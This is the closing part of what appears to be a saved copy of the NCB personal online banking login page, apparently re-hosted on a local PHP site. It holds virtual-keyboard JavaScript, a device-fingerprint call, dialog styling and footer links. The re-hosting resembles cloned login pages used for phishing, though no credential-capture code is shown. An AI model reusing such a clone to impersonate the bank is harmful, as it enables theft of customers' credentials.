             		determinePasswordStrength(editCtl.value,pwdImageValue,pwdStrengthValue,'null');
             }
        
        
        }else if (ctl.name == 'pp_caps'){ 
			var vCaps = document.getElementById('pp_caps').value;
			for(var vIndex=1;vIndex<=26;vIndex++){
				var vAlp = document.getElementById('alp_'+vIndex).value;
				
				if(vAlp==vAlp.toLowerCase()){
					var vTemp=vAlp.toUpperCase();
					document.getElementById('alp_'+vIndex).value=vTemp;
			document.getElementById('pp_caps').value=vCaps.toUpperCase();
				
				}else{		
					var vTemp=vAlp.toLowerCase();
					document.getElementById('alp_'+vIndex).value=vTemp;
				}
			document.getElementById('pp_caps').value=vCaps.toLowerCase();
			}
	
	
		}else {
		

            if(!editCtl.maxLength || editCtl.maxLength == 0 || editCtl.maxLength > editCtl.value.length) {

                insertData(editCtl, ctl.value);
            }
            tmpEditCtl = editCtl;
            if(editCtl.maxLength && editCtl.maxLength <= editCtl.value.length) {

                setPinPadCtl(null);
            }
	    if(tmpEditCtl.focus){
                setTimeout('tmpEditCtl.focus()', 1);
	    }
        }
    }
};
isIE=document.all? 1:0

		
		noKeyboard=function(e){
			keyEntry = !isIE? e.which:event.keyCode;
			if((keyEntry < '255') || (keyEntry > '0')){
				return false;
			}
		};
		
		
		var langBsdSmallAlp = {"001":"abcdefghijklmnopqrstuvwxyz","002":"abcdefghijklmnopqrstuvwxyz",
		"003":"abcdefghijklmnopqrstuvwxyz","004":"abcdefghijklmnopqrstuvwxyz"};
		var langBsdNum = {"001":"0123456789","002":"0123456789","003":"0123456789","004":"0123456789"};
		var langBsdSplChars = {"001":".+-!,@#$%&*()?=<>^_]{:\\|}`/[~\"\';","002":".+-!,@#$%&*()?=<>^_]{:\\|}`/[~\"\';",
		"003":".+-!,@#$%&*()?=<>^_]{:\\|}`/[~\"\';","004":".+-!,@#$%&*()?=<>^_]{:\\|}`/[~\"\';"};
		
		
		getCharBasedOnLangId=function(arrayObj){
			var chars = arrayObj[langID];
			var langArr = new Array();
			var character;
			
			if(chars == null){
				chars = arrayObj["001"];
			} 
			var charLen = chars.length;
			for(i=0; i < charLen ; i++){
				character = chars.substring(i,i+1);
				if(character == "\""){
					langArr[i] = "&quot";
				}else{
					langArr[i] = character;	
				}
			}		
			return langArr;
		};
		
		
		settingPinPadCtlOnFocus=function(whatobject,whatimage,whatelement){
			
			
			
			
			if(onFocus == 'Y'){
		
			var isVisible =jQuery('#pp_div').is(':visible');	
			var isHidden  =jQuery('#pp_div').css('visibility');	
			if(jQuery('#MODAL_VIEW_CONTAINER').length>0){
				if((isVisible && isHidden != 'hidden') && elem == whatelement ){
					//jQuery(document.getElementById('pp_div')).show();
					noAction = true;
					//return;
				}else{
				jQuery(document.getElementById('pp_div')).show();
				jQuery(document.getElementById('pp_div')).css('visibility','visible');
					noAction = false;
				}		
				}else{
				if(isVisible  && elem == whatelement ){
					//jQuery(document.getElementById('pp_div')).show();
					noAction = true;
					//return;
				}else{
				jQuery(document.getElementById('pp_div')).show();
				jQuery(document.getElementById('pp_div')).css('visibility','visible');
					noAction = false;
				}	
				}
				settingPinPadCtl(whatobject,whatimage,whatelement);
			}
			
			else{
			noAction = true;
			}
		};
		
		
		
		settingPinPadCtl=function(whatobject,whatimage,whatelement){
			if(noAction){
				return;
			}
			smallAlpArr = getCharBasedOnLangId(langBsdSmallAlp);
			numArr = getCharBasedOnLangId(langBsdNum);
			splCharArr = getCharBasedOnLangId(langBsdSplChars);


if(vRandomAlp==0){
	
	smallAlpArr.sort(function() {
return 0.5 - Math.random()})
}
if(vRandomNo==0){
	numArr.sort(function() {
return 0.5 - Math.random()})
}
if(vRandomSpl==0){
	splCharArr.sort(function() {
return 0.5 - Math.random()})
}


	var incr=0;
	var incralp=0,incrno=0,incrspl=0;
	var formname = '';
	var tempincralp;
	var tempincrno;
	var tempincrspl;
	for(j=0;document.forms[j] != null;j++)
	{
		for(i=0; document.forms[j].elements[i] != null; i++)
		{
			if((document.forms[j].elements[i].name == whatelement))
			{
				formname = document.forms[j].name;
			}
		}
	}
	if(jQuery('#MODAL_VIEW_CONTAINER').length>0){
	var formNameIdentifier ="FORMSGROUP_ID__";
	var formnameVal="";
	if(document.getElementById(formNameIdentifier)){
	formnameVal=document.getElementById(formNameIdentifier).value;
	}
	
	this.target=document.getElementById(document.getElementById(jQuery(whatelement).attr('id')));	
	}
	else{
	
	this.target=document.forms[formname].elements[whatelement];
	
	}
			
			
			
			var len = 11;
			var numSplVal = 0;
			var newRow;
			var smallAlpArrLen = smallAlpArr.length;
			var numArrLen = numArr.length;
			var splCharArrLen = splCharArr.length;
			
			if (whatimage == 2){  
				
		var sHTML='<div id="close-keypad" class="hideElementFromUI"><div id="keypadstyle"  class="">'
			+'<p align="right"> <span class="keyBoardTitle"> Virtual Keyboard</span> '
			+'<span class="keyBoardTitleInfo">(For entering password only)</span>'
			
			+'<span> <strong><a name="CLOSE_KEYPAD" id="CLOSE_KEYPAD" href="http://localhost:8080/phpSite/canda/javascript:setPinPadCtl(null),enableTextField(\''+whatelement+'\')" class="close" title="Close">x&nbsp;</a></strong></span> </p>' 
			
			+ '<p ><span id="titleBar" class="keyBordText" style="display:none"><ilayer width="100%" onSelectStart="return false">'
			+'<layer  width="100%" onMouseover="isHot=true;if (isN4) ddN4(pp_div)" onMouseout="isHot=false">'
			+'Access Code: '
			+'</layer></ilayer>'
			+'</span>'
			+'<span class="floatingleft" style="padding-bottom:5px"><input length="13" type=password name="buffer" id="input_buffer" value="" id=buffer onkeyup=checkPinPad(this) readonly style="display:none"></span>'
			+'</p></div>';
				
				sHTML = sHTML+'<div id="keypadclear" style="padding-left: 4px;width:100%" >';
				while(incralp < smallAlpArrLen || incrno < numArr.length || incrspl < splCharArrLen){
					
					sHTML = sHTML+'<p class="clearboth">';
					newRow=true;
					for (i=0; i < len; i++){
						
						
						if(i == 0){
							sHTML = sHTML+'<span  class="height28forkeypad">';
						} else{
							sHTML = sHTML+'<span>';
						}
						
						
						if(incrspl < splCharArrLen && i < len){
							tempincrspl=incrspl++;
							sHTML = sHTML+'<input class="mainButton" type="button" name="pp_'+incrspl+'" id="pp_'+incrspl+'" title="'+splCharArr[tempincrspl]+'"  value="'+splCharArr[tempincrspl]+'" onclick="applyNumber(this)"/></span>';
							if(incrspl == splCharArrLen ){
								sHTML = sHTML+ '<br>';
								i++ ;
							}
							newRow = false;
						}						
												
						
						if(incrno < numArrLen && i < len && newRow == true){
							tempincrno=incrno++;
							sHTML = sHTML+'<input class="mainButton" type="button" name="pp_'+incrno+'" id="pp_'+incrno+'" title="'+numArr[tempincrno]+'"  value="'+numArr[tempincrno]+'" onclick="applyNumber(this)"/></span>';
							if(incrno == numArrLen ){
								sHTML = sHTML+ '<br>';
								i++;
							}
							newRow = false;	
												
						}

											
						if(incralp < smallAlpArrLen && i < len && newRow == true){
							tempincralp=incralp++;
							sHTML = sHTML+'<input class="mainButton" type="button" name="alp_'+incralp+'" id="alp_'+incralp+'" title="'+smallAlpArr[tempincralp]+'"  value="'+smallAlpArr[tempincralp]+'" onclick="applyNumber(this)"/></span>';
							if(i == len-2){
								sHTML = sHTML+ '<br>';
								i++;
							}
						}
						
						
						 if((incrspl >= splCharArrLen || incralp >= smallAlpArrLen || incrno <= numArrLen) && i < len-1 ){
						 	sHTML = sHTML+'</span>';
						 	newRow = true;						 					 		
						}
						
					}
					
					
				}
				sHTML = sHTML+'<input class="mainButton_blank" type="button" /></span>';
				if(langID == '001'){
				sHTML = sHTML +'<span class=""><input class="keybtn_Caps" type="button" id="pp_caps" name="pp_caps" title="Caps" value="" alt="Caps" onclick="applyNumber(this)"/></span>';
			}else{
				sHTML = sHTML +'<span class=""><input class="keybtn_Caps" type="button" id="pp_caps" name="pp_caps" title="Caps" value="" alt="Caps" /></span>';
			}
			sHTML = sHTML+'<span class=""><input class="keybtn_Backspace" type="button" name="pp_erase" id="pp_erase" title="Backspace" value="" onclick="applyNumber(this)"/></span>'
				+'<span class=""><input class="keybtn_Clear" type="button" name="pp_clear" id="pp_clear" title="Clear" value="" onclick="applyNumber(this)"/></span>';
			sHTML = sHTML+'</p>';	
			sHTML = sHTML+'</div>';
			sHTML = sHTML+'</div>';
			}
	

document.getElementById("scriptdiv").innerHTML = sHTML;

	if(jQuery('#MODAL_VIEW_CONTAINER').length==0 ){
	if(typeof grpId == "undefined"){
	document.forms[formname].buffer.maxLength = 2147483647; 
	setPinPadCtl(document.forms[formname].elements[whatelement]);
	}
	else{	
		if(whatelement!=null && whatelement.indexOf(':')==-1){
		setPinPadCtl(document.getElementById(grpId+":"+whatelement));
		}else{
		setPinPadCtl(document.getElementById(whatelement));
		}
	}
	
	}
	else{
	var grpId='null';
	if(whatelement!=null && whatelement.indexOf(':')==-1){
		if('null' != grpId){
	setPinPadCtl(document.getElementById(grpId+":"+whatelement));
		}else{
			setPinPadCtl(document.getElementById(whatelement));
		}
	}else{
	setPinPadCtl(document.getElementById(whatelement));
	}
	}
	/*setPinPadCtl(document.forms[formname].buffer);*/
	
	elem = whatelement;
};


setPinPadCtl=function(ctl) {

    	
    if(ctl && !editCtl && ctl.maxLength && ctl.maxLength <= ctl.value.length) {
    
        return;
    }
    
    
    editCtl = ctl;
    var elements = document.forms[0].elements;
    for(i = 0; i <= 77; i++) {

        var el = elements['pp_' + i];
        if(el != null) {

            el.disabled = editCtl == null;
        }
    }
    var el = elements['pp_clear'];
	if(el != null) {

        el.disabled = editCtl == null;
    }
	var el = elements['pp_erase'];
	if(el != null) {

        el.disabled = editCtl == null;
    }
	var el = elements['close'];
	if(el != null) {

        el.disabled = editCtl == null;
    }
	var el = elements['done'];
    if(el != null) {

        el.disabled = editCtl == null;
    }
	var el = elements['buffer'];
    if(el != null) {

        el.disabled = editCtl == null;
    }
	var el = elements['help'];
    if(el != null) {

        el.disabled = editCtl == null;
    }

    topLayer=isIE ? 'BODY' : 'HTML';
    layer = isIE ? document.all.pp_div : document.getElementById ? document.getElementById('pp_div') : document.layers ? document.layers.pp_div : document.pp_div;

	if(isIE && event || !isIE && ctl) {

        hotLayer=isIE ? event.srcElement : ctl.target;
        while (hotLayer != null && hotLayer.id != 'titleBar' && hotLayer.tagName != topLayer) {

          hotLayer=isIE ? hotLayer.parentElement : hotLayer.parentNode;
        }
        if (hotLayer != null && hotLayer.id == 'titleBar' && ctl != null) {

          offsetx=isIE ? event.clientX : ctl.clientX;
          offsety=isIE ? event.clientY : ctl.clientY;
          nowX=parseInt(layer.style.left);
          nowY=parseInt(layer.style.top);
          ddEnabled=true;
          document.onmousemove=dd;
        }
    }
	
    if(layer==null){
    	layer=""; 
    }
	
    
    if(layer != null) {

        if(editCtl != null) {

            if (showFirstTime) {
		
                showFirstTimePinPad(layer, ctl);
                display();
                showFirstTime=false;
            } else {
		

				showPinPad(layer, ctl);
				display();
				
            }
        } else {

			hidePinPad(layer);
			display();
        }
    } else {

        alert('Pin Pad not supported by your browser');
    }
};

onloadNumber=function(ctl) {

    ctl.disabled = editCtl == null;
};

checkPinPad=function(ctl) {

    if(ctl.maxLength && ctl.maxLength != 0 && ctl.maxLength <= ctl.value.length) {

        setPinPadCtl(null);
    } else {

        if(editCtl == null)
            setPinPadCtl(this);
    }
};


showPinPad=function(ctl, pctl) {


	if (isIE || isNN) {

        layer.style.visibility='visible';
       
    } else if (isN4) {

        document.pp_div.visibility='show';
        
    }
};

showFirstTimePinPad=function(ctl, pctl) {


    var pX = 500;
    var pY = 250;

    if(ppY) {

        pY = ppY;
    } else if(pctl.screenTop) {

        pY = pctl.screenTop + 30;
    } else if(pctl.screenY) {

        pY = pctl.screenY + 30;
    }
    if(ppX) {

        pX = ppX;
    } else if(pctl.screenLeft) {

        pX = pctl.screenLeft;
    } else if(pctl.screenX) {

        pX = pctl.screenX;
    }
    if(ctl.style) {

        ctl.style.top = pY + rX;
        ctl.style.left = pX + rY;
    }
    if (isIE || isNN) {

		layer.style.visibility='visible';
    } else if (isN4) {

        document.pp_div.visibility='show';
        
	}
	
};

hidePinPad=function(ctl){

    if (isIE || isNN) {

		layer.style.visibility='hidden';

	} else if (isN4) {

		document.pp_div.visibility='hide';
    }
elem = null;
};

ddInit=function(ctl){

    var topLayer = isIE ? 'BODY' : 'HTML';

	var layer = isIE ? document.all.pp_div : document.getElementById ? document.getElementById('pp_div') : document.layers ? document.layers.pp_div : document.pp_div;

	var hotLayer = isIE ? event.srcElement : ctl.target;

	if (layer != null) {

        while (hotLayer.id != 'titleBar' && hotLayer.tagName != topLayer) {

		  hotLayer=isIE ? hotLayer.parentElement : hotLayer.parentNode;
		  if (hotLayer == null) return;
        }
        if (hotLayer.id == 'titleBar') {


		  offsetx=isIE ? event.clientX : ctl.clientX;
          offsety=isIE ? event.clientY : ctl.clientY;
          nowX=parseInt(layer.style.left);
          nowY=parseInt(layer.style.top);
          ddEnabled=true;
          document.onmousemove=dd;
        }
    }
};

dd=function(ctl){

  if (!ddEnabled) return;
  layer.style.left=isIE ? nowX+event.clientX-offsetx : nowX+ctl.clientX-offsetx+'px';
  layer.style.top=isIE ? nowY+event.clientY-offsety : (nowY+ctl.clientY-offsety)+'px';
  display();
  return false;
};

		 
		disbleTextField=function(whatelement){
		console.log('inside disbleTextField-------');
			
			var isVisible = document.getElementById('pp_div').style.visiblity = 'visible' ? true : false;
			if(isVisible && elem == whatelement){
				noAction = true;
				return;
			}else{
				noAction = false;
			}
			
			var j=0;
			var enab = true;
			var disb = true;
			while((document.forms[j] != null && (enab || disb))){
					
					for(i=0; document.forms[j].elements[i] != null; i++){
					
				 		if(isVisible && (document.forms[j].elements[i].name == elem)){
				 			document.forms[j].elements[i].disabled = false;
				 			enab = false;
				 		}else if((document.forms[j].elements[i].name == whatelement)){		
							
							document.forms[j].elements[i].disabled=true;
							disb = false;
					 	}
					 	if(!isVisible){
					 		enab = false;
					 	}
					}
				j++;
			}
			
		};
		
		
		setStyle=function(obj,style,value){
			obj.style[style]=value;
		};

	    
		enableTextField=function(whatelement){
			this.target.disabled=false;
		};

		getPixel=function(str) {
			if (str == "") {
				return "0";
			} else {
				return parseInt(str.substring(0, str.length-2),10);
			}
		};

		
		randomDisplay=function(){
			
			var scrollTop = window.pageYOffset || window.document.documentElement.scrollTop || window.document.body.scrollTop;
			var maxtop = scrollTop+320;
			var maxleft = 320;
			var pos = Math.random()*200;
			var locationtop;
			var locationleft;
			
			if (!isIE) {
				locationtop = getPixel(document.getElementById('pp_div').style.top);
			  	locationleft = getPixel(document.getElementById('pp_div').style.left);
			} else {
			  	locationtop = document.all.pp_div.style.pixelTop;
			  	locationleft = document.all.pp_div.style.pixelLeft;
			}
			
			if (pos <= 150)
				locationtop = locationtop + pos;
			else
			  	locationtop = locationtop - pos;
			
			if (locationleft <= 200)
			  	locationleft = locationleft + pos;
			else
			  	locationleft = locationleft - pos;
			
			if (locationtop < scrollTop) 
			  	locationtop = scrollTop;
			else if (locationtop > maxtop)
			  	locationtop = maxtop;
			
			if (locationleft<0)
			  	locationleft=1;
			else if (locationleft >= maxleft)
			  	locationleft=maxleft;
			if (!isIE) {
			  	document.getElementById('pp_div').style.top=locationtop+'px';
			  	document.getElementById('pp_div').style.left=locationleft+'px';
			} else {
			  	document.all.pp_div.style.pixelTop=locationtop;
			  	document.all.pp_div.style.pixelLeft=locationleft;
			}
			display();
		};



		
		fixedDisplay=function(element){
			/* Changes done for 11.0.8 Enhancement
			Virtual Keyboard will be displayed at right hand side of Virtual Keypad image */
			
			/* Fetch element which has focus */	
			var windowWidth  = jQuery(window).width();
			var whatelement="";
			
			whatelement=document.getElementById(element); 
			
			/* Fetch postition of element */
			var leftPosition = whatelement.offsetLeft;
			var topPosition = whatelement.offsetTop;
			var elementWidth = whatelement.offsetWidth;
			var elementHeight = document.getElementById('pp_div').offsetHeight;
			
			
            var leftBuffer = 0;
            var heightBuffer = 0;
            var grouplettBuffer = 0;
            var leftPosTotal = 0;
            var topPosTotal = 0;
             var isRTL ="N";
             if(jQuery('html')&& jQuery('html').css('direction')&& jQuery('html').css('direction')=="rtl"){
             isRTL = "Y";
             }     
               if(parseInt(windowWidth) >= 900){
              		leftBuffer = 110;
              		heightBuffer = 150;
              		grouplettBuffer = 70;
               }else if(parseInt(windowWidth) < 900 && parseInt(windowWidth)>= 800){
                  	leftBuffer = 200;
                  	heightBuffer =150;
                  	grouplettBuffer = 20;
               }else if(parseInt(windowWidth) < 800 && parseInt(windowWidth)>= 640){
                  	leftBuffer = 270;
                  	heightBuffer =150;
                  	grouplettBuffer = 20;
               }else{
               		leftBuffer = 300;
               		heightBuffer =150;                  	  
                  	grouplettBuffer = 10;                       
               }
               //Added for ticket 734570
               if(jQuery('#isRMLoginPage').length!=0 && typeof jQuery('#isRMLoginPage') != "undefined"){
            	   var isRMLogin = jQuery('#isRMLoginPage').val();
            	   if(isRMLogin === "Y" ){
            		   console.log("RM Authentication page ");
            		   leftBuffer = 0;
                  	   heightBuffer =0;                  	  
                       grouplettBuffer = 20; 
            	   }
               }
			
					if(isRTL=="Y"){
					leftPosTotal = leftPosition - elementWidth - leftBuffer;
					}else{
					leftPosTotal = leftPosition + elementWidth - leftBuffer;
					}
					topPosTotal = topPosition - elementHeight - heightBuffer;
			 		 
               var leftPosPercent = (parseInt(leftPosTotal)/parseInt(windowWidth))*100;
               
                                     			
			if(onFocus == 'Y' || jQuery('#MODAL_VIEW_CONTAINER').length>0 ){
				document.getElementById('pp_div').style.top = topPosTotal + 'px';
			}else{
				document.getElementById('pp_div').style.top = topPosTotal - 50 +'px';
			} 
			if(jQuery('#MODAL_VIEW_CONTAINER').length>0){
				if(parseInt(windowWidth) >= 900){	
					document.getElementById('pp_div').style.left = leftPosPercent +25+  '%' ;
				}
				else{		
					document.getElementById('pp_div').style.left = leftPosPercent +82+  '%' ;	
				}		
			}else{
				document.getElementById('pp_div').style.left = leftPosPercent +  '%' ;		
			}	
			if(isRTL=="Y"){
			document.getElementById('pp_div').style.right ='auto';
			}	
			display();
		};
		

                        fixedDisplayBelow=function(element){
                        	console.log("inside fixed display below"+element+"aaaa");
                                    /* Changes done for 11.0.8 Enhancement
                                    Virtual Keyboard will be displayed below */
                                    
                                    var windowWidth  = jQuery(window).width();
                                    /* Fetch element which has focus */       
                                    currentID = element;
                                    var whatelement = document.getElementById(element);
                                                                        
                                    /* Fetch postition of element */
                                    var leftPosition = whatelement.offsetLeft;
                                    var topPosition = whatelement.offsetTop;
                                    var elementWidth = whatelement.offsetWidth;
                                    var elementHeight = document.getElementById('pp_div').offsetHeight;
                                    
                                    var leftBuffer = 0;
                                    var heightBuffer = 0;
                                    
                                    if(parseInt(windowWidth) >= 900){
                                    	leftBuffer = 60;
                                    	heightBuffer = (elementHeight/2) + 36;
                                    } else if(parseInt(windowWidth) < 900 && parseInt(windowWidth)>= 800){
                                    	leftBuffer = 100;
                                    	if(onFocus == 'Y'){
                                    		heightBuffer = elementHeight;
                                    	} else{
                                    		heightBuffer = elementHeight + 5;
                                    	}
                                    }else if(parseInt(windowWidth) < 800 && parseInt(windowWidth)>= 640){
                                    	leftBuffer = 180;
                                    	if(onFocus == 'Y'){
                                    		heightBuffer = elementHeight;
                                    	} else{
                                    		heightBuffer = elementHeight + 5;
                                    	}
                                    } else{
                                    	leftBuffer = elementWidth;
                                        if(onFocus == 'Y'){
                                    		heightBuffer = elementHeight + 20;
                                    	} else{
                                    		heightBuffer = elementHeight + 25;
                                    	}
                                    }
          
                                    var leftPosTotal;
                                    if(jQuery('.next-genHeader').length>0){
                                    	leftPosTotal = leftPosition - leftBuffer;
                                    }else{
                                    	leftPosTotal = leftPosition + elementWidth - leftBuffer;
                                    }
                                    var leftPosPercent = (parseInt(leftPosTotal)/parseInt(windowWidth))*100;
                                    if(onFocus == 'Y'){            
                                    	//document.getElementById('pp_div').style.top=  topPosition + (elementHeight/2) + 10 +'px';                                    	
                                    	if(jQuery('.next-genHeader').length>0){
                                    	heightBuffer=-220;
                   							document.getElementById('pp_div').style.top=  topPosition +heightBuffer+'px';                                    	
                                    	}else{
                                    		document.getElementById('pp_div').style.top=  topPosition + heightBuffer +'px';
                                    	}
                                    	
                                    }else{
                                    	//document.getElementById('pp_div').style.top=  topPosition + (elementHeight/2) + 15 +'px';                                    	
                                    	if(jQuery('.next-genHeader').length>0){
                                    	heightBuffer=-220;
                   							document.getElementById('pp_div').style.top=  topPosition+heightBuffer +'px';                                    	
                                    	}else{
                                    		document.getElementById('pp_div').style.top=  topPosition + heightBuffer +'px';
                                    	}
                                    }
                                    //document.getElementById('pp_div').style.left= leftPosition + elementWidth - 100 + 'px';
                                    document.getElementById('pp_div').style.left= leftPosPercent + '%';                                               
                                    display();
                        };



                        fixedDisplayAbove=function(element){
                        	console.log("inside fixed display above"+element+"aaaa");
                                    
                                    var windowWidth  = jQuery(window).width();
                                    /* Fetch element which has focus */       
                                    currentID = element;
                                    var whatelement = document.getElementById(element);
                                                                        
                                    /* Fetch postition of element */
                                    var leftPosition = whatelement.offsetLeft;
                                    var topPosition = whatelement.offsetTop;
                                    var elementWidth = whatelement.offsetWidth;
                                    var elementHeight = document.getElementById('pp_div').offsetHeight;
                                    
                                    var leftBuffer = 0;
                                    var heightBuffer = 0;
                                    
                                    if(parseInt(windowWidth) > 900){
                                    	leftBuffer = 10;
                                    	heightBuffer=-220;
                                    } else if(parseInt(windowWidth) <= 900 && parseInt(windowWidth)>= 800){
                                    	leftBuffer = 150;
                                    	heightBuffer=-220;
                                    }else if(parseInt(windowWidth) < 800 && parseInt(windowWidth)>= 640){
                                    	leftBuffer = 210;
                                    	heightBuffer=-220;
                                    } else{
                                    	leftBuffer = 180;
                                    	heightBuffer=-220;
                                    }
                                    var leftPosTotal;
                                    leftPosTotal = leftPosition + elementWidth - leftBuffer;
                                    var leftPosPercent = (parseInt(leftPosTotal)/parseInt(windowWidth))*100;
                                    document.getElementById('pp_div').style.top=  topPosition + heightBuffer +'px';
                                    document.getElementById('pp_div').style.left= leftPosPercent + '%';                                               
                                    display();
                        };




						
						
		closeKeypad=function(){
			jQuery(document.getElementById('pp_div')).hide();
			if(jQuery('#MODAL_VIEW_CONTAINER').length>0){
			jQuery(document.getElementById('pp_div')).css('visibility','hidden');
			}
		}

ddN4=function(whatLayer){

  if (!isN4) return;
  N4=eval(whatLayer);
  N4.captureEvents(Event.MOUSEDOWN|Event.MOUSEUP);
  N4.onmousedown=function(ctl){

    N4.captureEvents(Event.MOUSEMOVE);
    N4x=ctl.x;
    N4y=ctl.y;
  }
  N4.onmousemove=function(ctl){

    if (isHot){

      N4.moveBy(ctl.x-N4x,ctl.y-N4y);
      return false;
    }
  }
  N4.onmouseup=function(){

    N4.releaseEvents(Event.MOUSEMOVE);
  }
};


donePinPad=function(buffer){
   this.target.value = buffer.value;
	buffer.value = '';
	
};

openPinPadHelp=function() {

    var url = 'pinpad.html';
    newwindow = window.open(url,'Security','height=500,width=700,scrollbars=yes,resizable=yes');
    if (window.focus) {

        newwindow.focus();
    }
};

display=function()
{
	if(navigator.userAgent.toLowerCase().indexOf("msie")!=-1)
	{
	if(document.getElementById('iframetop')!=null)
    {
		
		
        var layerdiv = document.getElementById('pp_div');
        layerdiv.style.display = '';
        
        var iframe = document.getElementById('iframetop');
        iframe.style.display = '';
        iframe.style.width = layerdiv.offsetWidth;
        iframe.style.height = layerdiv.offsetHeight;
        iframe.style.left = layerdiv.offsetLeft;
        iframe.style.top = layerdiv.offsetTop;
        iframe.style.visibility=layerdiv.style.visibility;
    }   
    }
};
setValues =function(strengthImage,strengthValue){
     pwdImageValue = strengthImage;
     pwdStrengthValue = strengthValue;
     
};
function getScrollXY() {
  var scrOfX = 0, scrOfY = 0;
  if( typeof( window.pageYOffset ) == 'number' ) {
    
    scrOfY = window.pageYOffset;
    scrOfX = window.pageXOffset;
  } else if( document.body && ( document.body.scrollLeft || document.body.scrollTop ) ) {
    
    scrOfY = document.body.scrollTop;
    scrOfX = document.body.scrollLeft;
  } else if( document.documentElement && ( document.documentElement.scrollLeft || document.documentElement.scrollTop ) ) {
    
    scrOfY = document.documentElement.scrollTop;
    scrOfX = document.documentElement.scrollLeft;
  }
  return [ scrOfX, scrOfY ];
}
--></script>


<script type="text/javascript">
document.onmousedown=ddInit;
document.onmouseup=Function("ddEnabled=false");
</script>
<iframe id="iframetop" scrolling="no" frameborder="0"> </iframe>
	<div id="pp_div" valign="right" class="keypaddiv" style="visibility: hidden; display: none;">
<div id="scriptdiv"></div>
</div>

<script type="text/javascript">ppX=100;ppY=100;setTimeout('setPinPadCtl(null)',1);</script>






<table>




</table>

  <script src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/pm_fp.html" language="JavaScript" type="text/javascript"> </script>


		
		
		
		
		
		
			
		
		
		
		
		
		<script language="javascript">
			post_deviceprint();
		</script>

		
		





	





	





	






	







	




	





	





	





	





	







  



<style>
.loginPage_dialog .ui-dialog-titlebar-close {display: none }
.loginPage_dialog .ui-dialog-titlebar{display: none }
.loginPage_dialog .ui-dialog-title{display: none }
.loginPage_dialog{
	box-shadow: 0 0px;
	background: #FFFFD7;
	border-radius: 0px;
	border:  1px solid transparent;
	overflow: visible;
	padding:20px;
	position: absolute;
	margin-left: 0px !important;
	margin-top: 35px;
	outline: none;
}
.infopopup {
	font-size: 14px;
	color: #000000;
}
.infopopup1 {
	font-size: 14px;
	color: #000000;
}
.infopopupSeperator {
	margin-top:15px;
	width: 245px;
	height: 0px;
	display: inline-block;
	border-top: 2px solid #A8A8A8;
}

.infopopup_highlight {
	display: inline-block;
	font-weight: 500;
	font-size: 16px;
	color: #2196f3;
	margin: 15px 0 15px 0;
	
}
.ui-autocomplete
{
    background: #FFFFFF !important;
    color: #FFFFFF;
    opacity: .99;
    cursor: default;
    position: absolute;
}
.userid-tooltip .heading3 {
    color: #2196f3;
    border-top: 2px solid #A8A8A8;
    padding: 15px 0;
    margin-top: 15px;
}
.ui-dialog .ui-dialog-content {
    position: relative;
    border: 0;
    padding: 2px 2px;
    background: none;
    overflow: visible;
    zoom: 1; 
    height: auto !important;  
}

</style>
<div id="dialog" title="The function for Remember User Id may not function if your cookies are disabled">
	<div class="arrow-up"></div>
  <p id="rememberContentTips1" style="display:none">
  	<!-- <span class="infopopup1">The function for Remember  User Id may not function if your cookies are disabled</span>-->
  	<span class="infopopup1">The function for Remember Username may not function if your cookies are disabled</span>
  	<br><span class="infopopupSeperator"></span><br>
  	<span class="infopopup_highlight">Security Tip</span><br>
  	<!-- <span class="infopopup">When you save your user id, it is stored on the computer you are using; therefore you should never store your user id on a public computer.</span>-->
  	<span class="infopopup">When you save your username, it is stored on 
the computer you are using; therefore you should never store your user 
id on a public computer.</span>
  </p>
</div> 
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
   
  
  
  
  
   
   
   
   
   
   
   
   
   
   
   
    
 
   
  
  <div class="width100percent_main_hidden" id="messageContent">
  
  
      
        
          
            
               
            
            
              
            
          <p id="messageContent.Ra1" class="loginrow">
<span id="messageContent.Ra1.C1" class="center-align"><img src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/hourglass.gif" alt="Hour Image" title="Hour Image" id="hourimage2" border="0"></span><span id="messageContent.Ra1.C2"><span class="" id="captionForDialog1" title="Authenticate yourself on your mobile">Authenticate yourself on your mobile</span></span></p>
  
          
           <script src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Chart.js"></script>
          
  </div>

  <div class="width100percent_main_hidden" id="confirmMessageContent">
  
      
        
          
            
               
              <!-- <i class="fa fa-hourglass-half fa-3x" aria-hidden="true"></i> -->
              
              
            
          <div id="confirmMessageContent.Ra1">
<div id="confirmMessageContent.Ra1.C1"><img src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/hourglass.gif" alt="Hour Image" title="Hour Image" id="hourimage3" border="0"><span class="null" id="Caption14725563">You have confirmed the Login Process</span></div></div>   
          
           <script src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Chart.js"></script>
          
  </div>

  <div class="width100percent_main_loginbg no-gutters login-container bg-dark" id="LoginHDisplay">
    
    <!--start of subsection--><div id="LoginHDisplay.SS1" class="loginScreenContainer">
      <div class="" id="LoginHDisplay.RS1">
      	  
            
			
				<div class="loginLinkcontainer">
			<div id="loginScreenLink"><a href="https://www.jncb.com/JNCB/media/Main-Librarie/Online%20Banking%20Documents/Personal/Online_Security_Privacy_Policy.pdf" name="HREFPrivacyfooter" target="_blank" id="PrivacyPolicyfooter">Online Security</a></div>
			<div id="loginScreenSep">|</div>
			<div id="loginScreenLink"><a href="https://www.jncb.com/" name="HREFPrivacyfooter" target="_blank" id="PrivacyPolicyfooter">FAQs</a></div>
			<div id="loginScreenSep">|</div>
			<div id="loginScreenLink"><a href="https://www.jncb.com/Personal/Banking/Online-Bank-Demos" name="HREFPrivacyfooter" target="_blank" id="PrivacyPolicyfooter">Internet Banking Demos</a></div>
			<div id="loginScreenSep">|</div>
			<div id="loginScreenLink"><a href="https://www.jncb.com/JNCB/media/Main-Librarie/Online%20Banking%20Documents/Personal/Online_Security_Privacy_Policy.pdf" name="HREFPrivacyfooter" target="_blank" id="PrivacyPolicyfooter">Privacy Policy</a></div>
			<div id="loginScreenSep">|</div>
			<div id="loginScreenLink"><a href="https://www.jncb.com/JNCB/media/Main-Librarie/Online%20Banking%20Documents/Personal/NCB_eFinancial_Services_Terms_Conditions.pdf" name="HREFPrivacyfooter" target="_blank" id="PrivacyPolicyfooter">Terms &amp; Conditions</a></div>
			</div>
			
            
          
          
